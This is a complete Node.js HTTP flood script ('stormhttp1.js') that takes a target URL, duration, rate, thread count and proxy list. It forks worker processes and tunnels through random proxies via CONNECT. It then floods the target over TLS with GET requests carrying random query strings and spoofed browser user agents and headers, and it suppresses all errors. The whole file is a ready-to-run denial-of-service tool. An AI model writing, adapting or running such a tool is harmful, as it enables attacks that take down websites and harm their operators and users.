const net = require("net");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function () { });

if (process.argv.length < 7) {
    console.log(`node stormhttp1.js [target] [time] [rate] [threads] [proxy.txt]`);
    process.exit();
}
function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}
function randomString(len) {
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let out = "";
    for (let i = 0; i < len; i++) out += chars[Math.floor(Math.random() * chars.length)];
    return out;
}

function randomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
};

const proxies = readLines(args.proxyFile);
const parsedTarget = new URL(args.target);

const fetch_site = ["none", "same-origin", "same-site", "cross-site"];
const languages = ["en-US","en-GB","en","de","fr","es","pt-BR","it","ru","ja","nl","pl","ko","tr","sv","au"];
const useragents = [
  "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1.1 Mobile/22B91 Safari/604.1",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6.1 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (iPad; CPU OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_7_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Safari/605.1.15",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1"
];

const Header = new class {
    HTTP(options, callback) {
        const payload =
            `CONNECT ${options.address} HTTP/1.1\r\n` +
            `Host: ${options.address}\r\n` +
            `Connection: keep-alive\r\n\r\n`;

        const conn = net.connect({
            host: options.host,
            port: options.port
        });

        conn.setTimeout(10000);
        conn.setKeepAlive(true, 60000);

        conn.on("connect", () => conn.write(payload));

        conn.on("data", chunk => {
            if (chunk.toString().includes("200")) {
                callback(conn, null);
            } else {
                conn.destroy();
                callback(null, "error");
            }
        });

        conn.on("error", () => {
            conn.destroy();
            callback(null, "error");
        });
        
        conn.on("timeout", () => {
            conn.destroy();
            callback(null, "error");
        });
    }
};

if (cluster.isMaster) {
    for (let i = 0; i < args.threads; i++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder, 0);
}

function buildRequest() {
    const rand = randomString(12);
    const path = parsedTarget.pathname ? parsedTarget.pathname : "/";
    const randomUA = useragents[Math.floor(Math.random() * useragents.length)];
    return (
        `GET ${path}?referrer=${rand} HTTP/1.1\r\n` +
        `Host: ${parsedTarget.host}\r\n` +
        `user-agent: ${randomUA}\r\n` +
        `sec-fetch-site: ${fetch_site[Math.floor(Math.random() * fetch_site.length)]}\r\n` +
        `accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n` +
        `accept-language: ${languages[Math.floor(Math.random() * languages.length)]}\r\n` +
        `accept-encoding: gzip, deflate, br\r\n` +
        `sec-fetch-mode: navigate\r\n` +
        `sec-fetch-dest: document\r\n`
    );
}
function runFlooder() {
    const proxy = randomElement(proxies);
    if (!proxy || !proxy.includes(":")) return;

    const [phost, pport] = proxy.split(":");

    Header.HTTP({
        host: phost,
        port: pport,
        address: parsedTarget.host + ":443"
    }, (connection, error) => {
        if (error) return;

        const tlsOptions = {
            socket: connection,
            servername: parsedTarget.host,
            rejectUnauthorized: false,
            ALPNProtocols: ["http/1.1"]
        };
        const tlsConn = tls.connect(tlsOptions);
        tlsConn.setKeepAlive(true, 60000);
        tlsConn.on("secureConnect", () => {
            setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const req = buildRequest();
                    tlsConn.write(req);
                    tlsConn.end();
                }
            });
        });
        tlsConn.on("close", () => {
            tlsConn.destroy();
            connection.destroy();
        });
    });
}
setTimeout(() => process.exit(1), args.time * 1000);